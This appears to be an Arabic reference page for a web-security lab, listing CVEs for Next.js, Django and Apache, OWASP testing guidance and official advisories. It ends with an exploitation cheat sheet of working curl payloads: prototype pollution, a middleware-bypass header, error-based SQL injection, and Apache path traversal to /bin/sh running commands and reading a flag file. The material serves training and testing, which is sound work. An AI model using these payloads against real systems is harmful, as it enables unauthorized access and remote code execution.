# المراجع والمصادر القياسية: أطر الويب الحديثة (Modern Web Stacks)

---

### 1. بيانات الثغرات الرسمية وقواعد بيانات الضعف الأمني (NVD & MITRE CVEs)

* **CVE-2025-29927: Next.js Middleware Authentication Bypass**
  * **NVD Entry:** [https://nvd.nist.gov/vuln/detail/CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
  * **CVSS v3.1:** 9.1 (Critical) | Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
  * **الوصف:** خلل في التحقق من مصدر ترويسة `x-middleware-subrequest` يتيح للمهاجمين الخارجيين تجاوز آليات الفحص الأمني للـ Middleware والوصول إلى المسارات المحمية.

* **CVE-2021-35042: Django SQL Injection in QuerySet.order_by()**
  * **NVD Entry:** [https://nvd.nist.gov/vuln/detail/CVE-2021-35042](https://nvd.nist.gov/vuln/detail/CVE-2021-35042)
  * **CVSS v3.1:** 9.8 (Critical) | Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  * **الوصف:** عدم تصفية المدخلات الموجهة إلى جمل `order_by()` في أطر Django 3.1 و 3.2 يسمح بتنفيذ استعلامات SQL غير مصرح بها.

* **CVE-2021-41773: Apache HTTP Server Path Traversal and Remote Code Execution**
  * **NVD Entry:** [https://nvd.nist.gov/vuln/detail/CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
  * **CVSS v3.1:** 9.8 (Critical) | Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
  * **الوصف:** خطأ في دالة تسوية المسارات قبل فك الترميز في Apache 2.4.49 يتيح تخطي المجلدات والوصول إلى ملفات النظام وتنفيذ الأوامر عبر وحدات CGI.

* **CVE-2021-42013: Apache HTTP Server Path Traversal and RCE (Incomplete Fix)**
  * **NVD Entry:** [https://nvd.nist.gov/vuln/detail/CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)
  * **الوصف:** ترقيع غير مكتمل لـ CVE-2021-41773 في Apache 2.4.50 تم تجاوزه باستخدام الترميز المزدوج `%%32%65%%32%65`.

---

### 2. معايير وإرشادات مشروع أمان تطبيقات الويب المفتوح (OWASP Standards)

* **OWASP Web Security Testing Guide (WSTG v4.2):**
  * **WSTG-INFO-008:** *Fingerprint Web Application Framework* — منهجية استخراج بصمات أطر العمل عبر ترويسات HTTP ومعاملات ملفات تعريف الارتباط وهياكل المسارات.
  * **WSTG-INFO-002:** *Fingerprint Web Server* — فحص إصدارات خوادم الويب واستجابات أخطاء الخادم.
  * **WSTG-INPV-005:** *Testing for SQL Injection* — استغلال حقن SQL المعتمد على رسائل الخطأ وحقن جمل الترتيب `ORDER BY`.
  * **WSTG-ATHN-004:** *Testing for Bypassing Authentication Schema* — تجاوز آليات المصادقة عند مستوى الـ Middleware والوكيل العكسي.

* **OWASP Top 10 (2021) Alignment:**
  * **A01:2021 – Broken Access Control:** تجاوز الـ Middleware في Next.js وتلويث النموذج الأولي لرفع الصلاحيات.
  * **A03:2021 – Injection:** حقن SQL في Django وتنفيذ أوامر النظام في Apache CGI.
  * **A05:2021 – Security Misconfiguration:** كشف صفحات التتبع التفصيلية `DEBUG=True` وإتاحة ترويسات الإصدارات البرمجية.
  * **A06:2021 – Vulnerable and Outdated Components:** تشغيل إصدارات معروفة باحتوائها على ثغرات دون ترقيع (مثل Apache 2.4.49).

---

### 3. الوثائق والمصادر التقنية الرسمية (Official Documentation)

* **Next.js Security Bulletins:**
  * [Next.js Security Advisory for Middleware Subrequest Handling](https://github.com/vercel/next.js/security/advisories)
  * [React Server Components (RSC) Architecture in Next.js App Router](https://nextjs.org/docs/app/building-your-application/rendering/server-components)
* **Django Project Security Releases:**
  * [Django 3.2.5 Security Release Archive (CVE-2021-35042)](https://docs.djangoproject.com/en/stable/releases/3.2.5/)
  * [Security in Django: CSRF Protection and QuerySet Hardening](https://docs.djangoproject.com/en/stable/topics/security/)
* **Apache Software Foundation:**
  * [Apache HTTP Server 2.4 Vulnerabilities Bulletin](https://httpd.apache.org/security/vulnerabilities_24.html)
  * [Apache Module mod_cgi Documentation](https://httpd.apache.org/docs/2.4/mod/mod_cgi.html)
* **Node.js & Express Security Practices:**
  * [Express Production Best Practices: Security and Performance](https://expressjs.com/en/advanced/best-practice-security.html)
  * [Helmet Security Middleware for Express](https://helmetjs.github.io/)

---

### 4. بطاقة الأوامر السريعة للمعمل (Command Quick Reference Sheet)

```bash
# ==============================================================================
# Modern Web Stacks Rapid Exploitation Cheat Sheet
# ==============================================================================

# 1. Express / MERN Prototype Pollution (Port 3000)
curl -c cookies.txt http://TARGET_IP:3000/
curl -b cookies.txt -X POST http://TARGET_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
curl -b cookies.txt http://TARGET_IP:3000/api/admin/flag

# 2. Next.js App Router Middleware Bypass (Port 3001 - CVE-2025-29927)
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET_IP:3001/dashboard

# 3. Django SQLi in ORDER BY (Port 8000 - CVE-2021-35042)
curl -s "http://TARGET_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'

# 4. Apache 2.4.49 Path Traversal & RCE (Port 8080 - CVE-2021-41773)
curl -s --path-as-is "http://TARGET_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt'

# 5. Automated Stack Fingerprint Scan
nikto -h http://TARGET_IP:PORT
```
